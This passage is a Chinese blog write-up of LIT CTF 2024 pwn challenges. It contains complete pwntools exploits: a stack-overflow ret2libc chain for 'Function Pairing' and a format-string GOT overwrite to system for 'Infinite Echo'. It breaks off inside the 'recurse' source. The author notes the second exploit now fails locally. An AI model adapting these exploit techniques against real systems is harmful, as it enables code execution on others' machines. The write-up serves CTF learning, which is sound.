<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/1337222.jpeg">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">
  <meta name="google-site-verification" content="GsKr_TM25sR2gHKJYhtCNDNQ97uQ7xXrUMirL678i7U">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"zaoganmaqule.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"always","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":true,"show_result":true,"style":"default"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="no pwn,no fun">
<meta property="og:type" content="website">
<meta property="og:title" content="every little helps">
<meta property="og:url" content="https://github.com/zaoganmaqule">
<meta property="og:site_name" content="DA1SY&#39;s Blog">
<meta property="og:description" content="no pwn,no fun">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://github.com/images/jxl31y.jpg">
<meta property="article:published_time" content="2024-08-15T14:09:01.000Z">
<meta property="article:modified_time" content="2024-08-19T09:40:57.103Z">
<meta property="article:author" content="da1sy">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="坐牢">
<meta property="article:tag" content="二进制">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://github.com/images/jxl31y.jpg">


<link rel="canonical" href="https://zaoganmaqule.github.io/2024/08/15/lit-ctf-pwn%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://zaoganmaqule.github.io/2024/08/15/lit-ctf-pwn%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/","path":"2024/08/15/lit-ctf-pwn部分题解/","title":"LIT - CTF - PWN部分题解"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>LIT - CTF - PWN部分题解 | DA1SY's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">DA1SY's Blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">Every little helps.</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">11</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">7</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">12</span></a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="搜索..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LIT-2024"><span class="nav-number"></span> <span class="nav-text">LIT 2024</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#pwn-Function-Pairing"><span class="nav-number">1.</span> <span class="nav-text">pwn&#x2F;Function Pairing</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#pwn-Infinite-Echo"><span class="nav-number">2.</span> <span class="nav-text">pwn&#x2F;Infinite Echo</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#pwn-recurse"><span class="nav-number">3.</span> <span class="nav-text">pwn&#x2F;recurse</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#pwn-w4dup-2de"><span class="nav-number">4.</span> <span class="nav-text">pwn&#x2F;w4dup 2de</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#pwn-iloveseccomp"><span class="nav-number">5.</span> <span class="nav-text">pwn&#x2F;iloveseccomp</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#pwn-How-to-Raise-a-Boring-Vuln-Flat"><span class="nav-number">6.</span> <span class="nav-text">pwn&#x2F;How to Raise a Boring Vuln Flat</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="da1sy"
      src="/images/jxl31y.jpg">
  <p class="site-author-name" itemprop="name">da1sy</p>
  <div class="site-description" itemprop="description">no pwn_no fun</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">12</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/zaoganmaqule" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;zaoganmaqule" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:zheh7777@gmail.com" title="E-Mail → mailto:zheh7777@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          链接
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <a href="https://github.com/zaoganmaqule" title="https:&#x2F;&#x2F;github.com&#x2F;zaoganmaqule" rel="noopener" target="_blank">My github</a>
            </li>
            <li class="links-of-blogroll-item">
              <a href="https://blog.csdn.net/has_zaoganmaqule?type=blog" title="https:&#x2F;&#x2F;blog.csdn.net&#x2F;has_zaoganmaqule?type&#x3D;blog" rel="noopener" target="_blank">My Blog</a>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://zaoganmaqule.github.io/2024/08/15/lit-ctf-pwn%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/jxl31y.jpg">
      <meta itemprop="name" content="da1sy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="DA1SY's Blog">
      <meta itemprop="description" content="no pwn_no fun">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="LIT - CTF - PWN部分题解 | DA1SY's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          LIT - CTF - PWN部分题解
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-08-15 22:09:01" itemprop="dateCreated datePublished" datetime="2024-08-15T22:09:01+08:00">2024-08-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">学习</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0/%E7%AC%94%E8%AE%B0/%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">比赛</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>10k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>9 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
<h2 id="LIT-2024"><a href="#LIT-2024" class="headerlink" title="LIT 2024"></a>LIT 2024</h2><p>Hi everyone,</p>
<p> We have some updates about Standard Round.</p>
<p> Due to unforeseen circumstances, <strong>we will be delaying the Standard Round by a week (contest window will be open from Aug 16-20)</strong>. We want to provide high quality problems for our contestants, and the extra time will allow us to finish preparing and testing the problems and the platform. <strong>CTF will still be running at the original planned time</strong>, and we hope you will enjoy the challenges we have written this year!</p>
</blockquote>
<p><strong>目录</strong></p>
<p>[LIT 2024]</p>
<p>[pwn&#x2F;Function Pairing]</p>
<p>[pwn&#x2F;Infinite Echo]</p>
<p>[pwn&#x2F;recurse ]</p>
<p>[pwn&#x2F;w4dup 2de ]</p>
<p>[ pwn&#x2F;iloveseccomp]</p>
<p>[pwn&#x2F;How to Raise a Boring Vuln Flat]</p>
<hr>
<h5 id="pwn-Function-Pairing"><a href="#pwn-Function-Pairing" class="headerlink" title="pwn&#x2F;Function Pairing"></a>pwn&#x2F;Function Pairing</h5><blockquote>
<p>I love how functions in C are named! We have: - open and close - fopen and fclose - read and write - fread and fwrite - gets and puts - fgets and fputs Connect with nc litctf.org 31774</p>
</blockquote>
<p><img src="https://s2.loli.net/2024/08/19/rYVxRhFP815bj3y.png" alt="f5b5f71d9a73479c9d8c95dcdf0e4032.png"></p>
<p>第一个gets有栈溢出。再利用puts函数泄露出来libc之后ret2libc。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    main <span class="token operator">=</span> <span class="token number">0x401196</span>
    fgets_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'fgets'</span><span class="token punctuation">]</span>
    puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
    pop_rdi <span class="token operator">=</span> <span class="token number">0x401293</span>
    ret <span class="token operator">=</span> <span class="token number">0x40101a</span>
    ru<span class="token punctuation">(</span><span class="token string">"1. gets/puts\n"</span><span class="token punctuation">)</span>
    pl <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x108</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fgets_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">"2. fgets/fputs"</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span>
    <span class="token comment"># pause()</span>
    ru<span class="token punctuation">(</span><span class="token string">"a\n"</span><span class="token punctuation">)</span>
    fgets <span class="token operator">=</span> u68<span class="token punctuation">(</span><span class="token punctuation">)</span>
    lg<span class="token punctuation">(</span><span class="token string">"fgets"</span><span class="token punctuation">,</span>fgets<span class="token punctuation">)</span>

    libc_base <span class="token operator">=</span> fgets <span class="token operator">-</span> <span class="token number">0x7f380</span>
    system <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x50d70</span>
    sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x1d8678</span>

    lg<span class="token punctuation">(</span><span class="token string">"libc_base"</span><span class="token punctuation">,</span>libc_base<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">"1. gets/puts\n"</span><span class="token punctuation">)</span>
    pl <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x108</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    <span class="token comment"># pause()</span>
    ru<span class="token punctuation">(</span><span class="token string">"2. fgets/fputs"</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span>

exp<span class="token punctuation">(</span><span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://s2.loli.net/2024/08/19/JGt3MsEvUV4pyDf.png" alt="7d5a82e052a142ea9896511f510cad64.png"></p>
<h5 id="pwn-Infinite-Echo"><a href="#pwn-Infinite-Echo" class="headerlink" title="pwn&#x2F;Infinite Echo"></a>pwn&#x2F;Infinite Echo</h5><blockquote>
<p>You <em>got</em> this! Connect with nc litctf.org 31772.</p>
</blockquote>
<pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token preprocessor property">#include &lt;stdio.h></span>
<span class="token preprocessor property">#include &lt;unistd.h></span>

<span class="token return-type class-name"><span class="token keyword">int</span></span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">setbuf</span><span class="token punctuation">(</span>stdout<span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setbuf</span><span class="token punctuation">(</span>stderr<span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Infinite Echo!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    buf<span class="token punctuation">[</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>给了c源码，可以看到明显的格式化字符串漏洞。</p>
<p><img src="https://s2.loli.net/2024/08/19/Ju4zFyPS5Qaksxm.png" alt="1197ad36fd9a423198a77257b585476b.png"></p>
<p>检查保护，可以修改got表</p>
<p><img src="https://s2.loli.net/2024/08/19/Xi79DuYBItT5GSj.png" alt="0735383487ad44349f285b1dfe42358b.png"></p>
<p>因为是在栈上的，分别泄露出libc_base和基地址base，之后把printf_got表部署到栈上，来进行修改。也可以利用fmtstr_payload进行修改，offset &#x3D; 6。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 

    ru<span class="token punctuation">(</span><span class="token string">"Infinite Echo!\n"</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">"%34$p-%37$p-"</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span>
    libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1f12e8</span>
    lg<span class="token punctuation">(</span><span class="token string">"libc_base"</span><span class="token punctuation">,</span>libc_base<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span>
    base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x10e0</span>
    lg<span class="token punctuation">(</span><span class="token string">"base"</span><span class="token punctuation">,</span>base<span class="token punctuation">)</span>

    system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>
    printf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span> <span class="token operator">+</span> base
    lg<span class="token punctuation">(</span><span class="token string">"printf_got"</span><span class="token punctuation">,</span>printf_got<span class="token punctuation">)</span>
    lg<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">,</span>system<span class="token punctuation">)</span>
   
    pl <span class="token operator">=</span> cyclic<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>printf_got<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
    s<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>

    s1 <span class="token operator">=</span> <span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span>
    s2 <span class="token operator">=</span> <span class="token punctuation">(</span>system<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span>
    lg<span class="token punctuation">(</span><span class="token string">"s1"</span><span class="token punctuation">,</span>s1<span class="token punctuation">)</span>
    lg<span class="token punctuation">(</span><span class="token string">"s2"</span><span class="token punctuation">,</span>s2<span class="token punctuation">)</span>
    pl <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"%c%c%c%c%c%c%c%c%c%c%c%</span><span class="token interpolation"><span class="token punctuation">&#123;</span>s2<span class="token operator">-</span><span class="token number">11</span><span class="token punctuation">&#125;</span></span><span class="token string">c%hhn"</span></span>
    pl <span class="token operator">=</span> pl<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>pl<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span> 
    ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    pl <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"%c%c%c%c%c%c%c%c%c%c%</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token punctuation">(</span>s1<span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">c%hn"</span></span>
    pl <span class="token operator">=</span> pl<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>pl<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span> 
    ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span> 
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>但我不知道为什么每次遇到这种题目，本地调试每次改总是不成功吧。反正很奇怪。我当时比赛的时候打通了，现在不知道怎么得就是没通，也是很搞笑了。如果有师傅知道为什么可以评论告诉我，谢谢师傅。</p>
<h5 id="pwn-recurse"><a href="#pwn-recurse" class="headerlink" title="pwn&#x2F;recurse"></a>pwn&#x2F;recurse</h5><blockquote>
<p>I hate loops.</p>
</blockquote>
<pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token preprocessor property">#include &lt;stdio.h></span>
<span class="token preprocessor property">#include &lt;string.h></span>
<span class="token preprocessor property">#include &lt;stdlib.h></span>
<span class="token preprocessor property">#include &lt;unistd.h></span>
<span class="token preprocessor property">#include &lt;sys/wait.h></span>

<span class="token keyword">int</span> <span class="token keyword">get</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> buf<span class="token punctuation">,</span> <span class="token class-name"><span class="token keyword">int</span></span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">fflush</span><span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> n<span class="token punctuation">,</span> stdin<span class="token punctuation">)</span> <span class="token operator">==</span> NULL<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token class-name"><span class="token keyword">int</span></span> end <span class="token operator">=</span> <span class="token function">strcspn</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>buf<span class="token punctuation">[</span>end<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'\0'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Too long"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    buf<span class="token punctuation">[</span>end<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> end<span class="token punctuation">;</span>
